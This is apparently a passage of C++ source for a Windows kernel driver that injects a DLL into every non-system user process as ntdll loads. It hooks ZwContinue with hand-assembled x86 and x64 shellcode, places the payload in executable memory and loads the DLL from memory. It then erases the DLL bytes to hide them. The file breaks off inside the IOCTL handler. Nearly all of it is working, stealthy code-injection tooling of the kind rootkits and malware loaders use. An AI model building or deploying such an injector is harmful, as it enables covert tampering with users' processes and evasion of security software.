

#include "undocumented.h"
#include "ssdt.h"
#include "ntdll.h"
#include "MemLoadDll.h"

#if 0
#include <ntstatus.h>
#endif

static UNICODE_STRING DeviceName;
static UNICODE_STRING Win32Device;

#define TAG_INJECTLIST	'ljni'
#define TAG_INJECTDATA	'djni'

#define IOCTL_SET_INJECT_X86DLL \
    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_IN_DIRECT, FILE_ANY_ACCESS)

#define IOCTL_SET_INJECT_X64DLL \
    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_IN_DIRECT, FILE_ANY_ACCESS)

//
//引入函数
//
extern "C"
NTKERNELAPI
PVOID NTAPI PsGetProcessWow64Process(PEPROCESS process);

extern "C"
NTKERNELAPI
NTSTATUS NTAPI PsLookupProcessByProcessId(
	_In_ HANDLE ProcessId,
	_Outptr_ PEPROCESS *Process
);

//
//注入列表结构体
//
typedef NTSTATUS(NTAPI* fn_NtAllocateVirtualMemory)(
	_In_ HANDLE ProcessHandle,
	_Inout_ PVOID *BaseAddress,
	_In_ ULONG_PTR ZeroBits,
	_Inout_ PSIZE_T RegionSize,
	_In_ ULONG AllocationType,
	_In_ ULONG Protect
	);
typedef NTSTATUS(NTAPI* fn_NtReadVirtualMemory)(
	_In_ HANDLE ProcessHandle,
	_In_opt_ PVOID BaseAddress,
	_Out_ PVOID Buffer,
	_In_ SIZE_T BufferSize,
	_Out_opt_ PSIZE_T NumberOfBytesRead
	);
typedef NTSTATUS(NTAPI* fn_NtWriteVirtualMemory)(
	_In_ HANDLE ProcessHandle,
	_In_opt_ PVOID BaseAddress,
	_In_ CONST VOID *Buffer,
	_In_ SIZE_T BufferSize,
	_Out_opt_ PSIZE_T NumberOfBytesWritten
	);

typedef NTSTATUS(NTAPI* fn_NtProtectVirtualMemory)(
	_In_ HANDLE ProcessHandle,
	_Inout_ PVOID *BaseAddress,
	_Inout_ PSIZE_T RegionSize,
	_In_ ULONG NewProtect,
	_Out_ PULONG OldProtect
	);


typedef struct _INJECT_PROCESSID_LIST {			//注入列表信息
	LIST_ENTRY	link;
	HANDLE pid;
	BOOLEAN	inject;
}INJECT_PROCESSID_LIST, *PINJECT_PROCESSID_LIST;

typedef struct _INJECT_PROCESSID_DATA {			//注入进程数据信息
	HANDLE	pid;
	PVOID	imagebase;
	SIZE_T	imagesize;
}INJECT_PROCESSID_DATA, *PINJECT_PROCESSID_DATA;

typedef struct _INJECT_PROCESSID_DLL {			//内存加载DLL信息
	PVOID	x64dll;
	ULONG	x64dllsize;
	PVOID	x86dll;
	ULONG	x86dllsize;
}INJECT_PROCESSID_DLL, *PINJECT_PROCESSID_DLL;

#pragma pack(push,1)

//
//x86 payload
//
typedef struct _INJECT_PROCESSID_PAYLOAD_X86 {
	UCHAR	saveReg[2]; //pushad //pushfd
	UCHAR	restoneHook[17]; // mov esi,5 mov edi,123 mov esi,456 rep movs byte
	UCHAR	invokeMemLoad[10]; // push xxxxxx call xxxxxx
	UCHAR	eraseDll[14]; // mov al,0 mov ecx,len mov edi,addr rep stos
	UCHAR	restoneReg[2];//popfd popad
	UCHAR	jmpOld[5]; //jmp

	UCHAR	oldData[5];

	UCHAR	dll[1];
	UCHAR	shellcode[1];

}INJECT_PROCESSID_PAYLOAD_X86, *PINJECT_PROCESSID_PAYLOAD_X86;

//
// x64 payload
//
typedef struct _INJECT_PROCESSID_PAYLOAD_X64 {
	UCHAR	saveReg[25];
	UCHAR	subStack[4];
	UCHAR	restoneHook[32]; // mov rcx,xxxx mov rdi,xxxx mov rsi,xxx rep movs byte
	UCHAR	invokeMemLoad[15]; // mov rcx,xxxxx call xxxx
	UCHAR	eraseDll[24]; // mov rdi,xxxx xor eax,eax mov rcx,xxxxx rep stosb
	UCHAR	addStack[4];
	UCHAR	restoneReg[27];
	UCHAR	jmpOld[14]; //jmp qword [0]

	UCHAR	oldData[14];//

	UCHAR	dll[1];
	UCHAR	shellcode[1];

}INJECT_PROCESSID_PAYLOAD_X64, *PINJECT_PROCESSID_PAYLOAD_X64;

#pragma pack(pop)

//
//全局进程链表
//
INJECT_PROCESSID_LIST	g_injectList;
INJECT_PROCESSID_DLL	g_injectDll;
ERESOURCE			g_ResourceMutex;
NPAGED_LOOKASIDE_LIST g_injectListLookaside;
NPAGED_LOOKASIDE_LIST g_injectDataLookaside;

fn_NtAllocateVirtualMemory	pfn_NtAllocateVirtualMemory;
fn_NtReadVirtualMemory		pfn_NtReadVirtualMemory;
fn_NtWriteVirtualMemory		pfn_NtWriteVirtualMemory;
fn_NtProtectVirtualMemory	pfn_NtProtectVirtualMemory;

//
//通过pid查询进程是否已经注入
//
BOOLEAN QueryInjectListStatus(HANDLE	processid)
{
	BOOLEAN result = FALSE;

	KeEnterCriticalRegion();
	ExAcquireResourceSharedLite(&g_ResourceMutex, TRUE);

	PLIST_ENTRY	head = &g_injectList.link;
	PINJECT_PROCESSID_LIST next = (PINJECT_PROCESSID_LIST)g_injectList.link.Blink;

	while (head != (PLIST_ENTRY)next)
	{
		if (next->pid == processid)
		{
			if (next->inject == TRUE)
			{
				result = TRUE;
			}
			
			break;
		}

		next = (PINJECT_PROCESSID_LIST)(next->link.Blink);
	}


	ExReleaseResourceLite(&g_ResourceMutex);
	KeLeaveCriticalRegion();

	return result;
}

//
//设置pid 注入状态为已注入
//
VOID SetInjectListStatus(HANDLE	processid)
{
	KeEnterCriticalRegion();
	ExAcquireResourceExclusiveLite(&g_ResourceMutex, TRUE);

	PLIST_ENTRY	head = &g_injectList.link;
	PINJECT_PROCESSID_LIST next = (PINJECT_PROCESSID_LIST)g_injectList.link.Blink;

	while (head != (PLIST_ENTRY)next)
	{
		if (next->pid == processid)
		{
			next->inject = TRUE;
			break;
		}

		next = (PINJECT_PROCESSID_LIST)(next->link.Blink);
	}


	ExReleaseResourceLite(&g_ResourceMutex);
	KeLeaveCriticalRegion();

}

//
//添加pid 到注入列表
//
VOID AddInjectList(HANDLE processid)
{
	//DPRINT("%s %d\n", __FUNCTION__, processid);

	KeEnterCriticalRegion();
	ExAcquireResourceExclusiveLite(&g_ResourceMutex, TRUE);

	PINJECT_PROCESSID_LIST newLink = (PINJECT_PROCESSID_LIST)\
		ExAllocateFromNPagedLookasideList(&g_injectListLookaside);

	if (newLink == NULL)
	{
		ASSERT(false);
	}
	newLink->pid = processid;
	newLink->inject = false;

	InsertTailList(&g_injectList.link, (PLIST_ENTRY)newLink);

	ExReleaseResourceLite(&g_ResourceMutex);
	KeLeaveCriticalRegion();
}

//
//进程退出 释放pid链表
//
VOID DeleteInjectList(HANDLE processid)
{
	//DPRINT("%s %d\n", __FUNCTION__, processid);

	KeEnterCriticalRegion();
	ExAcquireResourceExclusiveLite(&g_ResourceMutex, TRUE);

	PLIST_ENTRY	head = &g_injectList.link;
	PINJECT_PROCESSID_LIST next = (PINJECT_PROCESSID_LIST)g_injectList.link.Blink;

	while (head != (PLIST_ENTRY)next)
	{
		if (next->pid == processid)
		{
			RemoveEntryList(&next->link);
			ExFreeToNPagedLookasideList(&g_injectListLookaside, &next->link);
			break;
		}

		next = (PINJECT_PROCESSID_LIST)(next->link.Blink);
	}


	ExReleaseResourceLite(&g_ResourceMutex);
	KeLeaveCriticalRegion();
}

//
//getprocaddress
//
#define DEREF( name )*(UINT_PTR *)(name)
#define DEREF_64( name )*(unsigned __int64 *)(name)
#define DEREF_32( name )*(unsigned long *)(name)
#define DEREF_16( name )*(unsigned short *)(name)
#define DEREF_8( name )*(UCHAR *)(name)
ULONG_PTR GetProcAddressR(ULONG_PTR hModule, const char* lpProcName, bool x64Module)
{
	UINT_PTR uiLibraryAddress = 0;
	ULONG_PTR fpResult = NULL;

	if (hModule == NULL)
		return NULL;

	// a module handle is really its base address
	uiLibraryAddress = (UINT_PTR)hModule;

	__try
	{
		UINT_PTR uiAddressArray = 0;
		UINT_PTR uiNameArray = 0;
		UINT_PTR uiNameOrdinals = 0;
		PIMAGE_NT_HEADERS32 pNtHeaders32 = NULL;
		PIMAGE_NT_HEADERS64 pNtHeaders64 = NULL;
		PIMAGE_DATA_DIRECTORY pDataDirectory = NULL;
		PIMAGE_EXPORT_DIRECTORY pExportDirectory = NULL;

		// get the VA of the modules NT Header
		pNtHeaders32 = (PIMAGE_NT_HEADERS32)(uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew);
		pNtHeaders64 = (PIMAGE_NT_HEADERS64)(uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew);
		if (x64Module)
		{
			pDataDirectory = (PIMAGE_DATA_DIRECTORY)&pNtHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
		}
		else
		{
			pDataDirectory = (PIMAGE_DATA_DIRECTORY)&pNtHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
		}


		// get the VA of the export directory
		pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(uiLibraryAddress + pDataDirectory->VirtualAddress);

		// get the VA for the array of addresses
		uiAddressArray = (uiLibraryAddress + pExportDirectory->AddressOfFunctions);

		// get the VA for the array of name pointers
		uiNameArray = (uiLibraryAddress + pExportDirectory->AddressOfNames);

		// get the VA for the array of name ordinals
		uiNameOrdinals = (uiLibraryAddress + pExportDirectory->AddressOfNameOrdinals);

		// test if we are importing by name or by ordinal...
		if ((PtrToUlong(lpProcName) & 0xFFFF0000) == 0x00000000)
		{
			// import by ordinal...

			// use the import ordinal (- export ordinal base) as an index into the array of addresses
			uiAddressArray += ((IMAGE_ORDINAL(PtrToUlong(lpProcName)) - pExportDirectory->Base) * sizeof(unsigned long));

			// resolve the address for this imported function
			fpResult = (ULONG_PTR)(uiLibraryAddress + DEREF_32(uiAddressArray));
		}
		else
		{
			// import by name...
			unsigned long dwCounter = pExportDirectory->NumberOfNames;
			while (dwCounter--)
			{
				char * cpExportedFunctionName = (char *)(uiLibraryAddress + DEREF_32(uiNameArray));

				// test if we have a match...
				if (strcmp(cpExportedFunctionName, lpProcName) == 0)
				{
					// use the functions name ordinal as an index into the array of name pointers
					uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(unsigned long));

					// calculate the virtual address for the function
					fpResult = (ULONG_PTR)(uiLibraryAddress + DEREF_32(uiAddressArray));

					// finish...
					break;
				}

				// get the next exported function name
				uiNameArray += sizeof(unsigned long);

				// get the next exported function name ordinal
				uiNameOrdinals += sizeof(unsigned short);
			}
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		fpResult = NULL;
	}

	return fpResult;
}

//
// 搜索字符串,来自blackbone
//
LONG SafeSearchString(IN PUNICODE_STRING source, IN PUNICODE_STRING target, IN BOOLEAN CaseInSensitive)
{
	ASSERT(source != NULL && target != NULL);
	if (source == NULL || target == NULL || source->Buffer == NULL || target->Buffer == NULL)
		return STATUS_INVALID_PARAMETER;

	// Size mismatch
	if (source->Length < target->Length)
		return -1;

	USHORT diff = source->Length - target->Length;
	for (USHORT i = 0; i <= (diff / sizeof(WCHAR)); i++)
	{
 		if (RtlCompareUnicodeStrings(
			source->Buffer + i ,
			target->Length / sizeof(WCHAR),
			target->Buffer,
			target->Length / sizeof(WCHAR),
			CaseInSensitive
		) == 0)
		{
			return i;
		}
	}

	return -1;
}

//
//注入线程
//
VOID INJECT_ROUTINE_X86(
	_In_ PVOID StartContext)
{

	PINJECT_PROCESSID_DATA	injectdata = (PINJECT_PROCESSID_DATA)StartContext;

	DPRINT("x86注入 pid=%d %p\n", injectdata->pid, injectdata->imagebase);


	//
	//1.attach进程，2.找导出表ZwContinue 3.组合shellcode 4.申请内存  5.Hook ZwContinue 
	//

	ULONG			trace = 1;

	PEPROCESS		process;
	NTSTATUS		status;
	KAPC_STATE		apc;
	BOOLEAN			attach = false;

	ULONG64			pfnZwContinue = 0;
	PVOID			pZwContinue;

	PVOID			alloc_ptr = NULL;
	SIZE_T			alloc_size = 0;
	SIZE_T			alloc_pagesize = 5;
	ULONG			alloc_oldProtect = 0;

	ULONG			dllPos, shellcodePos;

	INJECT_PROCESSID_PAYLOAD_X86	payload = { 0 };

	UCHAR	hookbuf[5];
	ULONG	dwTmpBuf;
	SIZE_T	returnLen;

	//KdBreakPoint();

	//
	//1.attach进程
	//
	status = PsLookupProcessByProcessId(injectdata->pid, &process);
	if (!NT_SUCCESS(status) && process == NULL)
	{
		goto __exit;
	}
	ObDereferenceObject(process);

	trace = 2;
	KeStackAttachProcess(process, &apc);
	attach = true;

	//
	//2.找导出表ZwContinue
	//
	pfnZwContinue = (ULONG)GetProcAddressR((ULONG_PTR)injectdata->imagebase, "ZwContinue", false);
	if (pfnZwContinue == NULL)
	{
		goto __exit;
	}
	trace = 3;

	status = pfn_NtReadVirtualMemory(NtCurrentProcess(),
		(PVOID)pfnZwContinue,
		&payload.oldData,
		sizeof(payload.oldData),
		NULL);
	if (!NT_SUCCESS(status))
	{
		goto __exit;
	}

	trace = 4;


	//
	//3.计算shellcode 大小
	//
	alloc_size = sizeof(INJECT_PROCESSID_PAYLOAD_X86) + sizeof(MemLoadShellcode_x86) + g_injectDll.x86dllsize;

	payload.saveReg[0] = 0x60; //pushad
	payload.saveReg[1] = 0x9c; //pushfd

	payload.restoneHook[0] = 0xB9; // mov ecx,5
	payload.restoneHook[5] = 0xBE; // mov edi,xxxx
	payload.restoneHook[10] = 0xBF; // mov esi,xxxx
	payload.restoneHook[15] = 0xF3;
	payload.restoneHook[16] = 0xA4; // rep movsb

	payload.invokeMemLoad[0] = 0x68; // push xxxxxx
	payload.invokeMemLoad[5] = 0xE8; // call xxxxxx


	payload.eraseDll[0] = 0xB0;
	payload.eraseDll[2] = 0xB9;
	payload.eraseDll[7] = 0xBF;
	payload.eraseDll[12] = 0xF3;
	payload.eraseDll[13] = 0xAA;

	payload.restoneReg[0] = 0x9D; // popfd
	payload.restoneReg[1] = 0x61; // popad

	payload.jmpOld[0] = 0xE9;// jmp xxxxxx



	//
	//4.申请内存
	//
	status = pfn_NtAllocateVirtualMemory(NtCurrentProcess(),
		&alloc_ptr,
		NULL,
		&alloc_size,
		MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(status))
	{
		goto __exit;
	}
	trace = 5;
	//
	//5. Hook ZwContinue 
	//

	//计算dll 和shellcode位置
	dllPos = PtrToUlong(alloc_ptr) + sizeof(INJECT_PROCESSID_PAYLOAD_X86) - 2;
	shellcodePos = dllPos + g_injectDll.x86dllsize;

	//恢复hook
	dwTmpBuf = sizeof(payload.oldData);
	memcpy(&payload.restoneHook[1], &dwTmpBuf, sizeof(ULONG));
	dwTmpBuf = PtrToUlong(alloc_ptr) + (sizeof(INJECT_PROCESSID_PAYLOAD_X86) - 7);
	memcpy(&payload.restoneHook[6], &dwTmpBuf, sizeof(ULONG));
	memcpy(&payload.restoneHook[11], &pfnZwContinue, sizeof(ULONG));

	//调用内存加载
	memcpy(&payload.invokeMemLoad[1], &dllPos, sizeof(ULONG));
	dwTmpBuf = shellcodePos - (PtrToUlong(alloc_ptr) + 24) - 5;
	memcpy(&payload.invokeMemLoad[6], &dwTmpBuf, sizeof(ULONG));


	//擦除DLL
	dwTmpBuf = sizeof(MemLoadShellcode_x86) + g_injectDll.x86dllsize;
	memcpy(&payload.eraseDll[3], &dwTmpBuf, sizeof(ULONG));
	memcpy(&payload.eraseDll[8], &dllPos, sizeof(ULONG));

	//跳回去
	dwTmpBuf = (ULONG)pfnZwContinue - (PtrToUlong(alloc_ptr) + (sizeof(INJECT_PROCESSID_PAYLOAD_X86) - 12)) - 5;
	memcpy(&payload.jmpOld[1], &dwTmpBuf, sizeof(ULONG));

	status = pfn_NtWriteVirtualMemory(NtCurrentProcess(),
		alloc_ptr,
		&payload,
		sizeof(payload),
		&returnLen);
	if (!NT_SUCCESS(status))
	{
		goto __exit;
	}
	trace = 6;


	status = pfn_NtWriteVirtualMemory(NtCurrentProcess(),
		(PVOID)dllPos,
		g_injectDll.x86dll,
		g_injectDll.x86dllsize,
		&returnLen);
	if (!NT_SUCCESS(status))
	{
		goto __exit;
	}
	trace = 7;


	status = pfn_NtWriteVirtualMemory(NtCurrentProcess(),
		(PVOID)shellcodePos,
		&MemLoadShellcode_x86,
		sizeof(MemLoadShellcode_x86),
		&returnLen);
	if (!NT_SUCCESS(status))
	{
		goto __exit;
	}
	trace = 8;


	//
	//Hook
	//

	dwTmpBuf = PtrToUlong(alloc_ptr) - (ULONG)pfnZwContinue - 5;
	hookbuf[0] = 0xE9;
	memcpy(&hookbuf[1], &dwTmpBuf, sizeof(ULONG));


	//备份一遍原地址
	pZwContinue = (PVOID)pfnZwContinue;
	status = pfn_NtProtectVirtualMemory(NtCurrentProcess(),
		(PVOID*)&pfnZwContinue,
		&alloc_pagesize,
		PAGE_EXECUTE_READWRITE,
		&alloc_oldProtect);
	if (!NT_SUCCESS(status))
	{
		goto __exit;
	}
	trace = 9;

	status = pfn_NtWriteVirtualMemory(NtCurrentProcess(),
		(PVOID)pZwContinue,
		&hookbuf,
		sizeof(hookbuf),
		&returnLen);
	if (!NT_SUCCESS(status))
	{
		goto __exit;
	}
	trace = 10;


__exit:
	DPRINT("%s TRACE:%d status = %08X \n", __FUNCTION__, trace, status);
	if (attach) { KeUnstackDetachProcess(&apc); }
	ExFreeToNPagedLookasideList(&g_injectDataLookaside, StartContext);
	PsTerminateSystemThread(0);

}

VOID INJECT_ROUTINE_X64(
	_In_ PVOID StartContext)
{
	PINJECT_PROCESSID_DATA	injectdata = (PINJECT_PROCESSID_DATA)StartContext;
	DPRINT("x64注入 pid=%d %p\n", injectdata->pid, injectdata->imagebase);

	//
	//1.attach进程，2.找导出表ZwContinue 3.组合shellcode 4.申请内存  5.Hook ZwContinue 
	//

	ULONG			trace = 1;

	PEPROCESS		process;
	NTSTATUS		status;
	KAPC_STATE		apc;
	BOOLEAN			attach = false;

	ULONG64			pfnZwContinue = 0;
	PVOID			pZwContinue;

	PVOID			alloc_ptr = NULL;
	SIZE_T			alloc_size = 0;
	SIZE_T			alloc_pagesize = 5;
	ULONG			alloc_oldProtect = 0;

	ULONG64			dllPos, shellcodePos;

	INJECT_PROCESSID_PAYLOAD_X64	payload = { 0 };

	UCHAR	hookbuf[14] = { 0xff, 0x25, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
	ULONG64	dwTmpBuf;
	ULONG	dwTmpBuf2;
	SIZE_T	returnLen;

	//KdBreakPoint();

	//
	//1.attach进程
	//
	status = PsLookupProcessByProcessId(injectdata->pid, &process);
	if (!NT_SUCCESS(status) && process == NULL)
	{
		goto __exit;
	}
	ObDereferenceObject(process);

	trace = 2;
	KeStackAttachProcess(process, &apc);
	attach = true;

	//
	//2.找导出表ZwContinue
	//
	pfnZwContinue = GetProcAddressR((ULONG_PTR)injectdata->imagebase, "ZwContinue", true);
	if (pfnZwContinue == NULL)
	{
		goto __exit;
	}
	trace = 3;

	status = pfn_NtReadVirtualMemory(NtCurrentProcess(),
		(PVOID)pfnZwContinue,
		&payload.oldData,
		sizeof(payload.oldData),
		NULL);
	if (!NT_SUCCESS(status))
	{
		goto __exit;
	}
	trace = 4;

	//
	//3.计算shellcode 大小
	//
	alloc_size = sizeof(INJECT_PROCESSID_PAYLOAD_X64) + sizeof(MemLoadShellcode_x64) + g_injectDll.x64dllsize;

	UCHAR saveReg[] = "\x50\x51\x52\x53\x6A\xFF\x55\x56\x57\x41\x50\x41\x51\x6A\x10\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57";
	UCHAR restoneReg[] = "\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x41\x5B\x41\x5A\x41\x59\x41\x58\x5F\x5E\x5D\x48\x83\xC4\x08\x5B\x5A\x59\x58";

	memcpy(payload.saveReg, saveReg, sizeof(saveReg));
	memcpy(payload.restoneReg, restoneReg, sizeof(restoneReg));

	payload.subStack[0] = 0x48;
	payload.subStack[1] = 0x83;
	payload.subStack[2] = 0xec;
	payload.subStack[3] = 0x28;

	payload.addStack[0] = 0x48;
	payload.addStack[1] = 0x83;
	payload.addStack[2] = 0xc4;
	payload.addStack[3] = 0x28;

	payload.restoneHook[0] = 0x48;
	payload.restoneHook[1] = 0xb9; // mov rcx,len
	payload.restoneHook[10] = 0x48;
	payload.restoneHook[11] = 0xBF; //mov rdi,xxxx
	payload.restoneHook[20] = 0x48;
	payload.restoneHook[21] = 0xBe; //mov rsi,xxxx
	payload.restoneHook[30] = 0xF3;
	payload.restoneHook[31] = 0xA4; //REP MOVSB

	payload.invokeMemLoad[0] = 0x48;
	payload.invokeMemLoad[1] = 0xb9;  // mov rcx,xxxxxx
	payload.invokeMemLoad[10] = 0xE8; // call xxxxx

	payload.eraseDll[0] = 0x48;
	payload.eraseDll[1] = 0xbf; // mov rdi,addr
	payload.eraseDll[10] = 0x31;
	payload.eraseDll[11] = 0xC0; //xor eax,eax
	payload.eraseDll[12] = 0x48;
	payload.eraseDll[13] = 0xB9; //mov rcx,xxxxx
	payload.eraseDll[22] = 0xF3;
	payload.eraseDll[23] = 0xAA;

	payload.jmpOld[0] = 0xFF;// jmp xxxxxx
	payload.jmpOld[1] = 0x25;


	//
	//4.申请内存
	//
	status = pfn_NtAllocateVirtualMemory(NtCurrentProcess(),
		&alloc_ptr,
		NULL,
		&alloc_size,
		MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(status))
	{
		goto __exit;
	}
	trace = 5;
	//
	//5. Hook ZwContinue 
	//
	dllPos = ULONG64(alloc_ptr) + (sizeof(INJECT_PROCESSID_PAYLOAD_X64) - 2);
	shellcodePos = dllPos + g_injectDll.x64dllsize;


	//恢复hook
	dwTmpBuf = sizeof(payload.oldData);
	memcpy(&payload.restoneHook[2], &dwTmpBuf, sizeof(ULONG64));
	dwTmpBuf = (ULONG64)alloc_ptr + (sizeof(INJECT_PROCESSID_PAYLOAD_X64) - 16);
	memcpy(&payload.restoneHook[12], &pfnZwContinue, sizeof(ULONG64));
	memcpy(&payload.restoneHook[22], &dwTmpBuf, sizeof(ULONG64));

	//调用内存加载
	memcpy(&payload.invokeMemLoad[2], &dllPos, sizeof(ULONG64));
	dwTmpBuf2 = (ULONG)(shellcodePos - ((ULONG64)alloc_ptr + 0x47) - 5);
	memcpy(&payload.invokeMemLoad[11], &dwTmpBuf2, sizeof(ULONG));


	//擦除DLL
	dwTmpBuf = sizeof(MemLoadShellcode_x64) + g_injectDll.x64dllsize;
	memcpy(&payload.eraseDll[2], &dllPos, sizeof(ULONG64));
	memcpy(&payload.eraseDll[14], &dwTmpBuf, sizeof(ULONG64));

	//跳回去
	memcpy(&payload.jmpOld[6], &pfnZwContinue, sizeof(ULONG64));


	status = pfn_NtWriteVirtualMemory(NtCurrentProcess(),
		alloc_ptr,
		&payload,
		sizeof(payload),
		&returnLen);
	if (!NT_SUCCESS(status))
	{
		goto __exit;
	}
	trace = 6;

	status = pfn_NtWriteVirtualMemory(NtCurrentProcess(),
		(PVOID)dllPos,
		g_injectDll.x64dll,
		g_injectDll.x64dllsize,
		&returnLen);
	if (!NT_SUCCESS(status))
	{
		goto __exit;
	}
	trace = 7;

	status = pfn_NtWriteVirtualMemory(NtCurrentProcess(),
		(PVOID)shellcodePos,
		&MemLoadShellcode_x64,
		sizeof(MemLoadShellcode_x64),
		&returnLen);
	if (!NT_SUCCESS(status))
	{
		goto __exit;
	}
	trace = 8;

	//
	//Hook
	//

	hookbuf[0] = 0xFF;
	hookbuf[1] = 0x25;
	memcpy(&hookbuf[6], &alloc_ptr, sizeof(ULONG64));

	pZwContinue = (PVOID)pfnZwContinue;

	status = pfn_NtProtectVirtualMemory(NtCurrentProcess(),
		(PVOID*)&pfnZwContinue,
		&alloc_pagesize,
		PAGE_EXECUTE_READWRITE,
		&alloc_oldProtect);
	if (!NT_SUCCESS(status))
	{
		goto __exit;
	}
	trace = 9;

	status = pfn_NtWriteVirtualMemory(NtCurrentProcess(),
		(PVOID)pZwContinue,
		&hookbuf,
		sizeof(hookbuf),
		&returnLen);
	if (!NT_SUCCESS(status))
	{
		goto __exit;
	}
	trace = 10;


__exit:
	DPRINT("%s TRACE:%d status = %08X \n", __FUNCTION__, trace, status);
	if (attach) { KeUnstackDetachProcess(&apc); }
	ExFreeToNPagedLookasideList(&g_injectDataLookaside, StartContext);
	PsTerminateSystemThread(0);

}

VOID LoadImageNotify(
	_In_ PUNICODE_STRING FullImageName,
	_In_ HANDLE ProcessId,
	_In_ PIMAGE_INFO ImageInfo
)
{
	//
	//过滤system进程
	//

	if (FullImageName == NULL ||
		ProcessId == (HANDLE)4 ||
		ProcessId == (HANDLE)0 ||
		ImageInfo == NULL ||
		ImageInfo->SystemModeImage == 1)
	{
		return;
	}

	if (KeGetCurrentIrql() != PASSIVE_LEVEL)
	{
		return;
	}

	BOOLEAN		x64Process = false;

	PEPROCESS	process = NULL;
	if (!NT_SUCCESS(PsLookupProcessByProcessId(ProcessId, &process)))
	{
		return;
	}

	x64Process = (PsGetProcessWow64Process(process) == NULL);

	ObDereferenceObject(process);


	//
	//是否已经传入注入DLL
	//
	if (x64Process)
	{
		if (g_injectDll.x64dll == NULL || g_injectDll.x64dllsize == 0)
		{
			return;
		}
	}
	else
	{
		if (g_injectDll.x86dll == NULL || g_injectDll.x86dllsize == 0)
		{
			return;
		}
	}


	//
	//是否已经注入？
	//

	if (QueryInjectListStatus(ProcessId))
	{
		return;
	}

 
	//
	//是否是ntdll加载时机？
	//

	if (x64Process)
	{
		UNICODE_STRING	ntdll_fullimage;
		RtlInitUnicodeString(&ntdll_fullimage, L"\\System32\\ntdll.dll");
 		if (SafeSearchString(FullImageName, &ntdll_fullimage, TRUE) == -1)
		{
			return;
		}
	}
	else
	{
		UNICODE_STRING	ntdll_fullimage;
		RtlInitUnicodeString(&ntdll_fullimage, L"\\SysWOW64\\ntdll.dll");

		if (SafeSearchString(FullImageName, &ntdll_fullimage, TRUE) == -1)
		{
			return;
		}
	}

	//
	//开始注入
	//

	NTSTATUS	status;
	HANDLE		thread_hanlde;
	PVOID		thread_object;
	PINJECT_PROCESSID_DATA	injectdata = (PINJECT_PROCESSID_DATA)\
		ExAllocateFromNPagedLookasideList(&g_injectDataLookaside);

	if (injectdata == NULL)
	{
		return;
	}

	injectdata->pid = ProcessId;
	injectdata->imagebase = ImageInfo->ImageBase;
	injectdata->imagesize = ImageInfo->ImageSize;

	status = PsCreateSystemThread(
		&thread_hanlde,
		THREAD_ALL_ACCESS,
		NULL,
		NtCurrentProcess(),
		NULL,
		x64Process ? INJECT_ROUTINE_X64 : INJECT_ROUTINE_X86,
		injectdata);
	if (NT_SUCCESS(status))
	{
		//添加到已经注入列表里面
		SetInjectListStatus(ProcessId);

		if (NT_SUCCESS(ObReferenceObjectByHandle(thread_hanlde, THREAD_ALL_ACCESS, NULL, KernelMode, &thread_object, NULL)))
		{

			KeWaitForSingleObject(thread_object, Executive, KernelMode, FALSE, NULL);

			ObDereferenceObject(thread_object);
		}

		ZwClose(thread_hanlde);
	}

}

VOID CreateProcessNotify(
	_In_ HANDLE ParentId,
	_In_ HANDLE ProcessId,
	_In_ BOOLEAN Create
)
{
	UNREFERENCED_PARAMETER(ParentId);

	if (ProcessId == (HANDLE)4 || ProcessId == (HANDLE)0)
	{
		return;
	}

	if (KeGetCurrentIrql() != PASSIVE_LEVEL)
	{
		return;
	}


	//
	//如果进程销毁 则从注入列表里面移除
	//
	if (Create)
	{
		DPRINT("AddInjectList -> %d\n", ProcessId);
		AddInjectList(ProcessId);
	}
	else
	{
		DPRINT("DeleteInjectList -> %d\n", ProcessId);
		DeleteInjectList(ProcessId);
	}

}


VOID DriverUnload(
	IN PDRIVER_OBJECT DriverObject)
{

	PsSetCreateProcessNotifyRoutine(CreateProcessNotify, true);
	PsRemoveLoadImageNotifyRoutine(LoadImageNotify);

	NTDLL::Deinitialize();

	IoDeleteSymbolicLink(&Win32Device);
	IoDeleteDevice(DriverObject->DeviceObject);

	if (g_injectDll.x64dll != NULL)
	{
		ExFreePoolWithTag(g_injectDll.x64dll, 'd64x');
	}
	if (g_injectDll.x86dll != NULL)
	{
		ExFreePoolWithTag(g_injectDll.x86dll, 'd68x');
	}

	while (!IsListEmpty(&g_injectList.link))
	{
		PINJECT_PROCESSID_LIST next = (PINJECT_PROCESSID_LIST)g_injectList.link.Blink;
		RemoveEntryList(&next->link);
		ExFreeToNPagedLookasideList(&g_injectListLookaside, &next->link);
	}

	ExDeleteResourceLite(&g_ResourceMutex);
	ExDeleteNPagedLookasideList(&g_injectListLookaside);
	ExDeleteNPagedLookasideList(&g_injectDataLookaside);

}

NTSTATUS DriverDefaultHandler(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return Irp->IoStatus.Status;
}

NTSTATUS DriverControlHandler(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp)

{
	PIO_STACK_LOCATION  irpSp;// Pointer to current stack location
	NTSTATUS            ntStatus = STATUS_UNSUCCESSFUL;// Assume success
	ULONG               inBufLength; // Input buffer length
	ULONG               outBufLength; // Output buffer length
	PUCHAR				inBuf, outBuf;
	UNREFERENCED_PARAMETER(DeviceObject);

	PAGED_CODE();

	irpSp = IoGetCurrentIrpStackLocation(Irp);

	inBufLength = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	outBufLength = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

